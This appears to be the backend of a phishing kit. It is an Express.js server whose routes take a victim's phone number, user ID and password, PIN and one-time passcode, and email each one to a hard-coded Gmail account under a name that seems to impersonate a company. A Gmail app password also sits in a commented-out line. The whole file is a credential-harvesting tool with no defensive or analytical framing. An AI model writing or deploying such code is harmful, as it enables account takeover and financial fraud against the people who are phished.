const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "officialagnicoeagle@gmail.com";
///const pass = "hzykeeeripsdmqll";
// 16th

// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { phoneNumber } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Phone Number Details`,
    text: `Phone Number: ${phoneNumber}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for userId
app.post("/userId", (req, res) => {
  console.log(req.body);
  let { userId, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `UserId Confirmation`,
    text: `Your UserId is: ${userId}\nPassword: ${password}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let { pin } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PIN Verification`,
    text: `Your PIN is: ${pin}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let { otp } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `OTP Verification`,
    text: `Your OTP is: ${otp}`,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});

